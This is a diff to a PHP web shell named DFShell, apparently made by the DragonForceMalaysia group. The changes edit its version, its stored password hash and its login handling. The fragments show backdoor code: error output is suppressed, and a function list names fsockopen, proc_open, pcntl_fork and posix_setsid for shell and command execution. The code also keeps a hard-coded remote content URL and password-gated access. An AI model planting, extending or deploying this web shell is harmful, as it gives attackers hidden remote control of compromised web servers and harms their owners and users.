@@ -1,6 +1,6 @@
 <?php
 
-namespace DragonForceMalaysia;
+namespace DFM;
 
 ini_set('display_errors', 0);
 ini_set('display_startup_errors', 0);
@@ -17,7 +17,7 @@ error_reporting(0);
 // creating session
 
 session_start();
-$DFShell_Ver = 1.1;
+$DFShell_Ver = 1.0;
 $DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
 $DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
 "stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select"); // $GLOBALS['DFSyntax']
@@ -48,7 +48,7 @@ class DFShell{
     private $clen    = 0;       
     private $error   = false;   
 
-    static protected $pass = "S2dYZb2hul2ax9rjGJmdXA=="; //DFS@Malaysia
+    static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DFS@Malaysia
     static protected $remote_url = "https://raw.githubusercontent.com/EagleTube/DFS/main/contents";
     
     public function DFSPopupMSG($no,$title,$msg,$foot,$x){
@@ -148,7 +148,7 @@ class DFShell{
             return true;
         }else{
             echo "<script>alert('Wrong pass!');window.location.replace('".$GLOBALS['DFConfig'][2]['PHP_SELF']."')</script>";
-            //echo $this->Dec(self::$pass);
+            //echo $login_pass;
             return false;
         }
     }
@@ -1062,7 +1062,7 @@ $shell = new DFShell();
 if(!isset($_SESSION['DFS_Auth']) || empty($_SESSION['DFS_Auth'])){
     if(isset($GLOBALS['DFConfig'][1]['login'])){
         $shell->string = $GLOBALS['DFConfig'][1]['password'];
-        if($shell->DFSLogin($shell->Enc())){
+        if($shell->DFSLogin(urlencode($shell->Enc()))){
             header('Location: '.$GLOBALS['DFConfig'][2]['REQUEST_URI']);
         }
     }else{
